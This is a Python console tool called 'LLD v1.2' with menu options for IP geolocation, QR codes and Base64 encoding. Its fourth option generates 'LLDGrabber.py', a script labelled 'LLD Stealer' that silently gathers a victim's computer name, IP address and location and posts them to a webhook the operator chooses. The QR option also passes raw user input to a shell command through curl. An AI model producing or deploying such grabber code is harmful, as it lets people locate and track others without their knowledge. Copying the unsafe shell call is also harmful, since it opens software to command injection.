# it took me 3 hours to make 4 options LOL i was stuck on a bug
import os
import requests
import time
import colorama
import messagebox
from base64 import b64encode

messagebox.showinfo('Privacy Policy (1/2)', """
Privacy Policy

Effective Date: October 6, 2024

By using LLD Version 1.2 (“the Service”), you acknowledge and agree to the following terms:

1. No Warranty: The Service is provided "as-is" without any guarantees of accuracy, reliability, or availability.
   
2. Limitation of Liability: We are not liable for any direct, indirect, incidental, or consequential damages arising from your use of the Service. You assume all risks associated with its use.

3. Third-Party Links: The Service may contain links to third-party websites. We are not responsible for their content or practices.

4. Changes: This policy may be updated periodically. Please review it regularly for any changes.
""")

messagebox.showinfo('Code of Conduct (2/2)', """
Code of Conduct

Effective Date: October 6, 2024

By using LLD Version 1.2 (available at github.com), you agree to adhere to the following Code of Conduct:

1. User Responsibility: You are solely responsible for your actions while using the Service. Inappropriate or illegal behavior is not endorsed or condoned.

2. Prohibited Activities: Engaging in activities that may harm others, including harassment, abuse, or illegal actions, is strictly prohibited.

3. No Liability: We are not responsible for consequences arising from your actions while using the Service. Violations of this Code are solely your responsibility.

4. Reporting Violations: Please report any violations of this Code of Conduct to us at [Your Email Address].

5. Changes to the Code: This Code of Conduct may be updated periodically. Please review it regularly for any changes.

By using the Service, you acknowledge your understanding and acceptance of this Code of Conduct.
""")
def MenuCustom(text): # to remove this nasty ass code
    print(f"""
{colorama.Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════════════════════════════╗
{colorama.Fore.LIGHTCYAN_EX}║                                                                  ║   ╔══════════════════════╗
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██╗     ██╗     ██████╗  {colorama.Fore.LIGHTCYAN_EX}                      ║   ║   {colorama.Fore.BLUE} Other Commands    {colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██╔══██╗ {colorama.Fore.LIGHTCYAN_EX}                      ║   ║  [{colorama.Fore.RED}X{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Exit{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}          ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██║  ██║{colorama.Fore.LIGHTCYAN_EX}                       ║   ║  [{colorama.Fore.BLUE}G{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Github{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}        ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██║  ██║{colorama.Fore.LIGHTCYAN_EX}                       ║   ║  [{colorama.Fore.BLUE}Y{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Youtube{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}       ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ███████╗███████╗██████╔╝{colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ╚══════╝╚══════╝╚═════╝ {colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
{colorama.Fore.LIGHTCYAN_EX}║                                                        v1.2 {colorama.Fore.RED}BETA{colorama.Fore.LIGHTCYAN_EX} ║   ╚══════════════════════╝
{colorama.Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════════════════════════════╝

{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}+{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} {text}

""")
    

def Home():
    os.system('title LLD ^| Version 1.2')
    os.system('cls')
    print(f"""
{colorama.Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════════════════════════════╗
{colorama.Fore.LIGHTCYAN_EX}║                                                                  ║   ╔══════════════════════╗
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██╗     ██╗     ██████╗  {colorama.Fore.LIGHTCYAN_EX}                      ║   ║   {colorama.Fore.BLUE} Other Commands    {colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██╔══██╗ {colorama.Fore.LIGHTCYAN_EX}                      ║   ║  [{colorama.Fore.RED}X{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Exit{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}          ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██║  ██║{colorama.Fore.LIGHTCYAN_EX}                       ║   ║  [{colorama.Fore.BLUE}G{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Github{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}        ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ██║     ██║     ██║  ██║{colorama.Fore.LIGHTCYAN_EX}                       ║   ║  [{colorama.Fore.BLUE}Y{colorama.Fore.RESET}] - {colorama.Fore.WHITE}Youtube{colorama.Fore.RESET}{colorama.Fore.LIGHTCYAN_EX}       ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ███████╗███████╗██████╔╝{colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
{colorama.Fore.LIGHTCYAN_EX}║                 {colorama.Fore.BLUE}  ╚══════╝╚══════╝╚═════╝ {colorama.Fore.LIGHTCYAN_EX}                       ║   ║                      ║
{colorama.Fore.LIGHTCYAN_EX}║                                                        v1.2 {colorama.Fore.RED}BETA{colorama.Fore.LIGHTCYAN_EX} ║   ╚══════════════════════╝
{colorama.Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════════════════════════════╝

{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}01{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} IP Geolocation
{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}02{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} URL to QR Code
{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}03{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Base64 Encoder
{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.BLUE}04{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Generate IP Grabber

""")


def Main():
    while True:
        Home()
        option = input(f"{colorama.Fore.BLUE}Enter Option: {colorama.Fore.WHITE}")
        
        if option in {"01", "1"}:
            os.system('cls')
            os.system('title LLD ^| IP Geolocation ^| Version 1.2')
            MenuCustom('Ip Geolocation')
            ip_addr = input("Enter IP/Domain: ")
            response = requests.get(f'https://ipapi.co/{ip_addr}/json')

            if response.status_code == 200:
                data = response.json()
                ip = data.get('ip')
                network = data.get('network')
                latitude = data.get('latitude')
                longitude = data.get('longitude')
                city = data.get('city')
                postal = data.get('postal')
                countryname = data.get('country_name')
                region = data.get('region')
                calling_code = data.get('calling_code')
                google_maps = f"https://www.google.com/maps/@{latitude},{longitude},841m/data=!3m1!1e3"
                
                print(f'{colorama.Fore.BLUE}IP: {colorama.Fore.WHITE}{ip}')
                print(f'{colorama.Fore.BLUE}City: {colorama.Fore.WHITE}{city}')
                print(f'{colorama.Fore.BLUE}Postal: {colorama.Fore.WHITE}{postal}')
                print(f'{colorama.Fore.BLUE}Region: {colorama.Fore.WHITE}{region}')
                print(f'{colorama.Fore.BLUE}Google Maps:{colorama.Fore.WHITE} {google_maps}')
                print(f'{colorama.Fore.BLUE}Country Name: {colorama.Fore.WHITE}{countryname}')
                print(f'{colorama.Fore.BLUE}Calling Code: {colorama.Fore.WHITE}{calling_code}')
            else:
                print(f"{colorama.Fore.RED}[!] - Failed to retrieve data. Status code: {response.status_code}")
            
            print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.YELLOW}!{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Press any key to go back")
            os.system('pause >nul')
            Home()

        elif option in {"02", "2"}:
            os.system('cls')
            os.system('title LLD ^| URL to QR Code ^| Version 1.2')
            MenuCustom('URL to QR Code')
            url = input(f"{colorama.Fore.BLUE}Enter URL: {colorama.Fore.WHITE}")
            os.system(f'curl qrcode.show/{url}')

            print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.YELLOW}!{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Press any key to go back")
            os.system('pause >nul')
            Home()
        elif option in {"03", "3"}:
            os.system('cls')
            os.system('title LLD ^| Base64 Encoder ^| Version 1.2')
            MenuCustom('Base64 Encoder')
            Enter_code = input(f'{colorama.Fore.BLUE}Enter Something you want to encode: {colorama.Fore.WHITE}')
            
            encoded = b64encode(Enter_code.encode('utf-8'))
            print(f"{colorama.Fore.BLUE}Encoded Version: {encoded}")
            print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.YELLOW}!{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Press any key to go back")
            os.system('pause >nul')
            Home()

        elif option in {"04", "4"}:
            os.system('cls')
            os.system('title LLD ^| IP Grabber Generator ^| Version 1.2')
            MenuCustom('IP Grabber Generator')
            webhookurl = input(f"{colorama.Fore.BLUE}Enter Webhook: {colorama.Fore.WHITE}")
            ewContent = f"""
import requests
import os

def get_ip_info():
    response = requests.get(f'https://ipapi.co/json')

    if response.status_code == 200:
        data = response.json()
        cpn = os.getenv("COMPUTERNAME")
        ip = data.get('ip')
        network = data.get('network')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        city = data.get('city')
        postal = data.get('postal')
        countryname = data.get('country_name')
        region = data.get('region')
        calling_code = data.get('calling_code')
        google__maps = f"https://www.google.com/maps/@{{latitude}},{{longitude}},841m/data=!3m1!1e3"

        embed = {{
            'title': 'LLD Stealer',
            'description': f'Computer Name: {{cpn}}\\nIP Address: {{ip}}\\nNetwork: {{network}}\\nCity: {{city}}\\nRegion: {{region}}\\nCountry: {{countryname}}\\nPostal: {{postal}}\\nLatitude: {{latitude}}\\nLongitude: {{longitude}}\\nCalling Code: {{calling_code}}\\n[Google Maps]({{google__maps}})',
            'footer': {{
                'text': 'LLD v1.2 BETA'
            }},
            'color': 16711680
        }}

        payload = {{
            'embeds': [embed]
        }}

        requests.post('{webhookurl}', json=payload)
    else:
        exit

get_ip_info()
"""


            with open("LLDGrabber.py", "w") as f:
                f.write(ewContent)
            print(f"{colorama.Fore.LIGHTCYAN_EX}[{colorama.Fore.YELLOW}!{colorama.Fore.RESET}] {colorama.Fore.LIGHTCYAN_EX}- {colorama.Fore.WHITE} Press any key to go back")
            os.system('pause >nul')
            Home()

        elif option.lower() in {"x", "exit"}:
            exit()
        elif option.lower() in {"g", "github"}:
            os.system("start https://github.com/questionMrk")
        elif option.lower() in {"y", "youtube"}:
            os.system("start https://www.youtube.com/@questionmark_3m")
        else:
            print(f"{colorama.Fore.RED}[!] - Invalid option. Please try again.")
            time.sleep(2)

if __name__ == "__main__":
    Main()
